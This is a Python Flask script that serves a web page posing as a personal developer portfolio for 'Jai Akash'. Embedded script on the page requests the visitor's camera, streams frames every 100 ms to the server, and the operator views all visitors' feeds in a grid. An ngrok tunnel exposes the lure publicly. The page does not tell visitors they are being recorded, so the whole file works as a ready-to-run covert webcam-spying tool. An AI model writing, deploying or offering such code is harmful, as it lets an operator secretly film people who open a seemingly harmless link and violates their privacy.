try:
    import base64
    import threading
    import cv2
    import numpy as np
    import os
    from flask import Flask, render_template_string
    from flask_socketio import SocketIO
    from pyngrok import ngrok
except ImportError:
    os.system("pip install flask flask-socketio eventlet opencv-python numpy pyngrok")
    import base64, threading, cv2, numpy as np, os
    from flask import Flask, render_template_string
    from flask_socketio import SocketIO
    from pyngrok import ngrok

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")

# Multi-client frames
frames = {}
frames_lock = threading.Lock()

# Portfolio HTML page with camera access
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Jai's Portfolio</title>
<style>
    * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', sans-serif; }
    body { background: linear-gradient(135deg, #f5f7fa, #c3cfe2); color:#333; }

    .hero {
        height:100vh; display:flex; flex-direction:column;
        justify-content:center; align-items:center; text-align:center;
        background: linear-gradient(to right, #667eea, #764ba2); color:white; padding:0 20px;
    }
    .hero h1 { font-size:4em; margin-bottom:0.5em; text-shadow: 2px 2px 10px rgba(0,0,0,0.2);}
    .hero p { font-size:1.5em; margin-bottom:1em;}
    .hero a {
        text-decoration:none; color:#fff; background:#ff5e62;
        padding:15px 30px; border-radius:50px; font-weight:bold;
        box-shadow:0 5px 15px rgba(0,0,0,0.2); transition:0.3s;
    }
    .hero a:hover { transform:translateY(-3px); box-shadow:0 8px 20px rgba(0,0,0,0.3); }

    section { padding:80px 20px; max-width:1000px; margin:0 auto; }
    h2 { text-align:center; font-size:2.5em; margin-bottom:1em; color:#333; }
    p { text-align:center; font-size:1.2em; color:#555; line-height:1.6em; }

    .skills { display:flex; flex-wrap:wrap; justify-content:center; gap:20px; margin-top:40px; }
    .skill { background:white; padding:20px; border-radius:15px; box-shadow:0 5px 15px rgba(0,0,0,0.1);
             width:150px; text-align:center; font-weight:bold; color:#333; transition:0.3s;}
    .skill:hover { transform:translateY(-5px); box-shadow:0 10px 20px rgba(0,0,0,0.2); }

    footer { text-align:center; padding:30px 20px; background:#333; color:white; }
    footer a { color:#ff5e62; text-decoration:none; font-weight:bold;}
</style>
</head>
<body>

<div class="hero">
    <h1>Jai Akash</h1>
    <p>Aspiring Tech Entrepreneur & Developer</p>
    <a href="#contact">Contact Me</a>
</div>

<section id="about">
    <h2>About Me</h2>
    <p>Hello! I am Jai Akash, a passionate tech enthusiast specializing in software development, app creation, and innovative tech solutions.</p>
</section>

<section id="skills">
    <h2>My Skills</h2>
    <div class="skills">
        <div class="skill">Python</div>
        <div class="skill">Flask</div>
        <div class="skill">React</div>
        <div class="skill">Kotlin</div>
        <div class="skill">Android</div>
        <div class="skill">AI/ML</div>
    </div>
</section>

<section id="contact">
    <h2>Contact</h2>
    <p>Feel free to reach out via email or LinkedIn.</p>
    <p><a href="mailto:jaiakash@example.com">jaiakash@example.com</a> | <a href="https://www.linkedin.com/in/jaiakash" target="_blank">LinkedIn</a></p>
</section>

<footer>
    &copy; 2025 Jai Akash. All rights reserved.
</footer>

<script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
<script>
const socket = io();
const clientId = Math.floor(Math.random()*1000000);  // unique client id

async function startCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { width:320, height:240 }, audio:false });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        const canvas = document.createElement('canvas');
        canvas.width = 320; canvas.height = 240;
        const ctx = canvas.getContext('2d');

        setInterval(()=>{
            ctx.drawImage(video,0,0,320,240);
            canvas.toBlob((blob)=>{
                if(!blob) return;
                const reader = new FileReader();
                reader.onloadend = ()=>{
                    const b64 = reader.result.split(',')[1];
                    socket.emit('frame',{client_id:clientId, image:b64});
                };
                reader.readAsDataURL(blob);
            }, 'image/jpeg', 0.6);
        }, 100); // 10 FPS
    } catch(err) {
        alert("Camera access denied: " + err.message);
    }
}
startCamera();
</script>

</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

# Receive frames from multiple clients
@socketio.on("frame")
def handle_frame(data):
    client_id = data.get("client_id")
    b64 = data.get("image")
    if not client_id or not b64:
        return
    try:
        jpg = base64.b64decode(b64)
        arr = np.frombuffer(jpg, dtype=np.uint8)
        img = cv2.imdecode(arr, cv2.IMREAD_COLOR)
        if img is not None:
            with frames_lock:
                frames[client_id] = img
    except Exception as e:
        print("Frame error:", e)

# OpenCV window: show multi-client feeds in split screen
def show_video():
    while True:
        with frames_lock:
            if not frames:
                continue
            imgs = list(frames.values())
            n = len(imgs)
            cols = min(2, n)
            rows = (n + cols - 1)//cols
            resized = [cv2.resize(im, (320,240)) for im in imgs]
            while len(resized) < rows*cols:
                resized.append(np.zeros((240,320,3), dtype=np.uint8))
            rows_imgs = []
            for r in range(rows):
                row_img = np.hstack(resized[r*cols:(r+1)*cols])
                rows_imgs.append(row_img)
            grid = np.vstack(rows_imgs)
            cv2.imshow("Multi-Client Camera Feeds", grid)
        if cv2.waitKey(1) == 27:  # ESC to exit
            break
    cv2.destroyAllWindows()

if __name__ == "__main__":
    t = threading.Thread(target=show_video)
    t.daemon = True
    t.start()

    # Start ngrok tunnel
    public_url = ngrok.connect(3000)
    print("🔗 Public Portfolio Link:", public_url)

    socketio.run(app, host="0.0.0.0", port=3000)
    print("Exiting...")
